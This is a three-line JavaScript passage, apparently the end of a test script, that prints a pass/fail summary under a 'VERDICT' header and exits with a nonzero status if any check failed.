hr("VERDICT");
p(`  ${PASS} PASS / ${FAIL} FAIL`);
process.exit(FAIL === 0 ? 0 : 1);
